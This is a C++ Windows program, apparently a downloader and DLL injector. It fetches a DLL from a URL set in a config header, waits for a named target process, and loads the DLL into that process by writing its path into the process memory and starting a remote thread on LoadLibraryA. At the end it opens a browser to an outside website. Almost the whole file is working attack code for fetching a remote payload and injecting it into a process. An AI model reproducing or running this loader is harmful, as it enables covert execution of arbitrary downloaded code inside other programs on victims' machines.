/*
	||||||||||||
	| INCLUDES |
	||||||||||||
*/

#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <string>
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <random>
#include <csignal>
#include <fstream>
#include <iostream>
#include <sstream> 
#include <iostream>
#include <random>
#include <string>
#include <fstream>
#include <sstream>
#include <strsafe.h>
#include <string>
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

#include "config.h"

#pragma comment(lib, "urlmon.lib")
#define UNLEN 64

using namespace std;


/*
	|||||||||| ||||||||
	|  CODE  | | CODE |
	|||||||||| ||||||||
*/


bool GetProcessEntryByName(string name, PROCESSENTRY32* pe) {
	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		cerr << "Tool helper cannot be created" << endl;
		return false;
	}

	if (!Process32First(snapshot, pe)) {
		cerr << "Tool helper cannot retrieve the first entry of process list" << endl;
		return false;
	}

	do {
		std::wstring wName(name.begin(), name.end());
		if (pe->szExeFile == wName) {
			snapshot ? CloseHandle(snapshot) : 0;
			return true;
		}
	} while (Process32Next(snapshot, pe));

	snapshot ? CloseHandle(snapshot) : 0;
	return false;
}

int main() {
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	string fullPath;

	char download[MAX_PATH] = { 0 };
	Sleep(500);
	string dllname = name; 
	string lokalizacja = path;
	string url = link; 
	HRESULT hr = URLDownloadToFileA(NULL, (url).c_str(), (lokalizacja).c_str(), 0, NULL); 

	GetFullPathNameA(lokalizacja.c_str(), MAX_PATH, download, nullptr);
	fullPath = string(download, MAX_PATH);

	Sleep(500);

	for (; !GetProcessEntryByName(process, &pe); Sleep(100));
	auto process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, pe.th32ProcessID);
	if (!process) {
		cerr << "Process cannot be opened" << endl;
		exit;
	}

	auto fpLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	auto mem = VirtualAllocEx(process, NULL, fullPath.length() + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!mem) {
		cerr << "Library name cannot be allocated" << endl;
		goto exit;
	}

	if (!WriteProcessMemory(process, mem, fullPath.c_str(), fullPath.length() + 1, nullptr)) {
		cerr << "Library name cannot be written" << endl;
		goto exit;
	}

	if (!CreateRemoteThread(process, nullptr, 0, (LPTHREAD_START_ROUTINE)fpLoadLibrary, mem, 0, nullptr)) {
		cerr << "Threads cannot be created" << endl;
		goto exit;
	}
	process ? CloseHandle(process) : 0;
exit:
	Sleep(1000);
	system("start https://g0dp0li3h.pl");
}